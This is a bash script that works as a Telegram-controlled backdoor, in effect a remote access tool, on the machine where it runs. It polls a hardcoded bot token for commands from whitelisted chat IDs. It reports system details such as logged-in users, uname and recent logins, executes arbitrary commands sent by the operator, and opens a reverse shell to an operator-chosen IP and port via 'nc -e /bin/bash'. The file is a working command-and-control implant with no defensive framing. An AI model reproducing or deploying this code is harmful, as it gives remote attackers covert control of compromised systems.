#!/bin/bash

TOKEN='1365965193:AAE7DFdfFxqoNSToADJJW5RIZkrKCtw30R4'
URL='https://api.telegram.org/bot'$TOKEN
MSG_URL=$URL'/sendMessage?chat_id='
UPD_URL=$URL'/getUpdates?offset='
OFFSET=0
TIMEOUT='&timeout=30'
ALLOW_ID=("1297663267" "985712809")

parse_json ()
{
	throw () {
	  echo "$*" >&2
	  exit 1
	}

	BRIEF=0
	LEAFONLY=0
	PRUNE=0
	NORMALIZE_SOLIDUS=0

	parse_options() {
	  set -- "$@"
	  local ARGN=$#
	  while [ "$ARGN" -ne 0 ]
	  do
	    case $1 in
	      -b) BRIEF=1
	          LEAFONLY=1
	          PRUNE=1
	      ;;
	      -l) LEAFONLY=1
	      ;;
	      -p) PRUNE=1
	      ;;
	      -s) NORMALIZE_SOLIDUS=1
	      ;;
	      ?*) echo "ERROR: Unknown option."
	          usage
	          exit 0
	      ;;
	    esac
	    shift 1
	    ARGN=$((ARGN-1))
	  done
	}

	awk_egrep () {
	  local pattern_string=$1

	  gawk '{
	    while ($0) {
	      start=match($0, pattern);
	      token=substr($0, start, RLENGTH);
	      print token;
	      $0=substr($0, start+RLENGTH);
	    }
	  }' pattern="$pattern_string"
	}

	tokenize () {
	  local GREP
	  local ESCAPE
	  local CHAR

	  if echo "test string" | egrep -ao --color=never "test" &>/dev/null
	  then
	    GREP='egrep -ao --color=never'
	  else
	    GREP='egrep -ao'
	  fi

	  if echo "test string" | egrep -o "test" &>/dev/null
	  then
	    ESCAPE='(\\[^u[:cntrl:]]|\\u[0-9a-fA-F]{4})'
	    CHAR='[^[:cntrl:]"\\]'
	  else
	    GREP=awk_egrep
	    ESCAPE='(\\\\[^u[:cntrl:]]|\\u[0-9a-fA-F]{4})'
	    CHAR='[^[:cntrl:]"\\\\]'
	  fi

	  local STRING="\"$CHAR*($ESCAPE$CHAR*)*\""
	  local NUMBER='-?(0|[1-9][0-9]*)([.][0-9]*)?([eE][+-]?[0-9]*)?'
	  local KEYWORD='null|false|true'
	  local SPACE='[[:space:]]+'

	  $GREP "$STRING|$NUMBER|$KEYWORD|$SPACE|." | egrep -v "^$SPACE$"
	}

	parse_array () {
	  local index=0
	  local ary=''
	  read -r token
	  case "$token" in
	    ']') ;;
	    *)
	      while :
	      do
	        parse_value "$1" "$index"
	        index=$((index+1))
	        ary="$ary""$value" 
	        read -r token
	        case "$token" in
	          ']') break ;;
	          ',') ary="$ary," ;;
	          *) throw "EXPECTED , or ] GOT ${token:-EOF}" ;;
	        esac
	        read -r token
	      done
	      ;;
	  esac
	  [ "$BRIEF" -eq 0 ] && value=$(printf '[%s]' "$ary") || value=
	  :
	}

	parse_object () {
	  local key
	  local obj=''
	  read -r token
	  case "$token" in
	    '}') ;;
	    *)
	      while :
	      do
	        case "$token" in
	          '"'*'"') key=$token ;;
	          *) throw "EXPECTED string GOT ${token:-EOF}" ;;
	        esac
	        read -r token
	        case "$token" in
	          ':') ;;
	          *) throw "EXPECTED : GOT ${token:-EOF}" ;;
	        esac
	        read -r token
	        parse_value "$1" "$key"
	        obj="$obj$key:$value"        
	        read -r token
	        case "$token" in
	          '}') break ;;
	          ',') obj="$obj," ;;
	          *) throw "EXPECTED , or } GOT ${token:-EOF}" ;;
	        esac
	        read -r token
	      done
	    ;;
	  esac
	  [ "$BRIEF" -eq 0 ] && value=$(printf '{%s}' "$obj") || value=
	  :
	}

	parse_value () {
	  local jpath="${1:+$1,}$2" isleaf=0 isempty=0 print=0
	  case "$token" in
	    '{') parse_object "$jpath" ;;
	    '[') parse_array  "$jpath" ;;
	    # At this point, the only valid single-character tokens are digits.
	    ''|[!0-9]) throw "EXPECTED value GOT ${token:-EOF}" ;;
	    *) value=$token
	       # if asked, replace solidus ("\/") in json strings with normalized value: "/"
	       [ "$NORMALIZE_SOLIDUS" -eq 1 ] && value=${value//\\\//\/}
	       isleaf=1
	       [ "$value" = '""' ] && isempty=1
	       ;;
	  esac
	  [ "$value" = '' ] && return
	  [ "$LEAFONLY" -eq 0 ] && [ "$PRUNE" -eq 0 ] && print=1
	  [ "$LEAFONLY" -eq 1 ] && [ "$isleaf" -eq 1 ] && [ $PRUNE -eq 0 ] && print=1
	  [ "$LEAFONLY" -eq 0 ] && [ "$PRUNE" -eq 1 ] && [ "$isempty" -eq 0 ] && print=1
	  [ "$LEAFONLY" -eq 1 ] && [ "$isleaf" -eq 1 ] && \
	    [ $PRUNE -eq 1 ] && [ $isempty -eq 0 ] && print=1
	  [ "$print" -eq 1 ] && printf "[%s]\t%s\n" "$jpath" "$value"
	  :
	}

	parse () {
	  read -r token
	  parse_value
	  read -r token
	  case "$token" in
	    '') ;;
	    *) throw "EXPECTED EOF GOT $token" ;;
	  esac
	}

	if ([ "$0" = "$BASH_SOURCE" ] || ! [ -n "$BASH_SOURCE" ]);
	then
	  parse_options "$@"
	  tokenize | parse
	fi
}

send_message ()
{
	res=$(curl -s --insecure --data-urlencode "text=$2" "$MSG_URL$1&" &)
}

send_message "1297663267" "Knock Knock Neo..."

bot_function ()
{
	case $1 in
		'/start') msg="Commands:
/who (who)
/uname (uname -a)
/last (last session)
/shell 1.1.1.1 443 (reverse shell)
/command uname -a (write only basic commands)
";;
		'/who')   msg="$(who)";;
		'/uname') msg="$(uname -a)";;
		'/last') msg="$(last)";;
		'/shell'*) 
		IP=$(echo $MESSAGE|awk '{print $2}')
		PORT=$(echo $MESSAGE|awk '{print $3}')
		nc -e /bin/bash $IP $PORT &
		msg="[+] Shell Running."
		;;
		'/command'*)
		COMMAND=$(echo $MESSAGE|sed "s/\/command //g")
		EX=$($COMMAND)
		msg=$EX
		;;
		*) msg="Command not found.";;
	esac
	send_message "$2" "$msg"
}

while true; do {
	res=$(curl -s --insecure $UPD_URL$OFFSET$TIMEOUT)
	TARGET=$(echo $res | parse_json | egrep '\["result",0,"message","chat","id"\]' | cut -f 2)
	OFFSET=$(echo $res | parse_json | egrep '\["result",0,"update_id"\]' | cut -f 2)
	MESSAGE=$(echo $res | parse_json -s | egrep '\["result",0,"message","text"\]' | cut -f 2 | cut -d '"' -f 2)
	USER=$(echo $res | parse_json | egrep '\["result",0,"message","from","username"\]' | cut -f 2 | cut -d '"' -f 2)
	OFFSET=$((OFFSET+1))
	printf "[$(date +%Y.%m.%d_%H:%M:%S)][$TARGET][$USER] $MESSAGE\n"
	if [ $OFFSET != 1 ]; then
		if [[ " ${ALLOW_ID[@]} " =~ " ${TARGET} " ]]; then
			bot_function "$MESSAGE" "$TARGET"
		else send_message "$TARGET" "Error. Your ID: $TARGET not Found."
		fi

	fi

}; done
